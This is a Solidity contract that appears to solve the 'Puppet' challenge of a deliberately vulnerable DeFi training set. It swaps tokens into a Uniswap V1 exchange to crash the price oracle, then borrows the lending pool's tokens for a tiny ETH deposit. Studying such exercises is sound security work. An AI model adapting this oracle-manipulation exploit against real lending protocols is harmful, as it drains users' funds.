//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../puppet/PuppetPool.sol";
import "../DamnValuableToken.sol";
import "./IUniswapExchange.sol";

// import "../../build-uniswap-v1/UniswapV1Exchange.json";

contract PuppetHack {
    DamnValuableToken public token;
    IUniswapExchange public exchange;
    PuppetPool public pool;
    uint256 player_initial_tokenBalance;

    constructor(
        address _token,
        address _exchange,
        address _pool,
        uint256 _player_initial_tokenBalance
    ) payable {
        token = DamnValuableToken(_token);
        exchange = IUniswapExchange(_exchange);
        pool = PuppetPool(_pool);
        player_initial_tokenBalance = _player_initial_tokenBalance;
    }

    function attack() public {
        token.approve(address(exchange), player_initial_tokenBalance);
        // exchange.tokenToEthSwapInput(player_initial_tokenBalance, 1, block.timestamp + 5000);
        exchange.tokenToEthSwapInput(
            player_initial_tokenBalance,
            1,
            9999999999
        );
        uint256 deposit = pool.calculateDepositRequired(
            player_initial_tokenBalance
        );
        pool.borrow{value: deposit, gas: 1000000}(
            player_initial_tokenBalance,
            msg.sender
        );
    }

    receive() external payable {}
}
